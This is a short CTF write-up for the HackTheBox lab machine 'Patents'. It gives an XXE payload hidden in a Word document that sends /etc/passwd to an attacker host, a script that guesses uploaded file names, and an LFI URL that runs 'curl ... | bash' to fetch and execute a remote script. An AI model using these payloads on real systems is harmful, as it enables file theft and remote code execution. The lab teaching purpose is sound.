---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/TtAa0vFyXYU/0.jpg
layout: post
media_subpath: /assets/posts/2020-05-16-patents-hackthebox
tags:
- binary exploitation
- hackthebox
- lfi
- linux
- path traversal
- rop
- word
- xxe
title: Patents @ HackTheBox
---

Patents is a 40-point Linux machine on HackTheBox. For user we exploit an external entity injection in a word document and a local file inclusion that involves path traversal and calculating the name of an uploaded file. For root we use return oriented programming to exploit a stack overflow in a tcp server.

{% youtube TtAa0vFyXYU %}

## Notes

customXml\\item1.xml:

```xml
<?xml version="1.0" ?>

<!ENTITY % sp SYSTEM "http://10.10.14.8:8000/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```

dtd.xml:

```xml
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.8:8000/dtd.xml?%data;'>">
```

Rce.py:

```python
#!/usr/bin/python3
import hashlib
import datetime
import requests
import time

proxyDict = { 
              "http"  : "127.0.0.1:8081", 
            }

result = requests.get("http://patents.htb")
dateHdr = result.headers['Date']
t = datetime.datetime.strptime(dateHdr, '%a, %d %b %Y %H:%M:%S GMT')
t -= datetime.timedelta(minutes=5)
it = int(t.timestamp())


while True: 
    url = f"http://patents.htb/uploads/{hashlib.sha256(b'xct.php' + str(it).encode('utf-8')).hexdigest()}.docx"
    r = requests.get(url)#, proxies=proxyDict)
    if r.status_code == 200:
        print(it)
        print(url)
    it += 1
```

LFI:

```
http://patents.htb/getPatent_alphav1.0.php?id=..././uploads/<id>.docx&cmd=curl%2010.10.14.8:8000/xct.sh%20|%20bash
```

The [Root Exploit](https://gist.github.com/xct/015d603058327f081c6fd4357de34a54).

## Reads

- <https://blogs.sap.com/2017/04/24/openxml-in-word-processing-custom-xml-part-mapping-flat-data/>
- <https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440>
- <https://github.com/Svenito/exploit-pattern>